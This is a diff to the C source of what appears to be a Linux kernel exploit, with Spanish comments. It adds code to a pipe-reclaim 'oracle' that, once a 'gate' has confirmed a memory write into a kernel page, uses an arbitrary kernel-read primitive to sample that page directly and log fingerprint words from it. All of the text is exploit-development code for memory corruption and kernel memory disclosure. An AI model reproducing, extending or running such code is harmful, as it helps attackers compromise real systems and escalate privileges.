@@ -1133,6 +1133,31 @@ uintptr_t scan_p0_pipe_oracle(void) {
   int second_score = -1;
   int changed_pages = 0;
 
+  /* DZH1: el MCAST escribe en la pagina del kernel page, no en los pipes.
+     Si el gate ya confirmo el write, muestreamos esa pagina directamente. */
+  if (p0_gate_page_struct && p0_physical_write_ok) {
+    uintptr_t gate_direct = page_to_direct(p0_gate_page_struct);
+    memset(page, 0, sizeof(page));
+    if (kernel_read_data(pipe_fds_reclaim[0][0], gate_direct,
+                         page, scan_size) == (ssize_t)scan_size) {
+      uint64_t sampled_words[P0_FINGERPRINT_WORDS];
+      for (size_t word = 0; word < P0_FINGERPRINT_WORDS; word++) {
+        memcpy(&sampled_words[word], page + p0_fingerprint_offsets[word],
+               sizeof(sampled_words[word]));
+      }
+      pr_info("p0 fingerprint page-struct direct=%016zx "
+              "w0=%016llx w1=%016llx w2=%016llx w3=%016llx\n",
+              gate_direct,
+              (unsigned long long)sampled_words[0],
+              (unsigned long long)sampled_words[1],
+              (unsigned long long)sampled_words[2],
+              (unsigned long long)sampled_words[3]);
+    } else {
+      pr_warning("p0 fingerprint page-struct read failed direct=%016zx errno=%d\n",
+                 gate_direct, errno);
+    }
+  }
+
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
     memset(page, 0, sizeof(page));
     if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
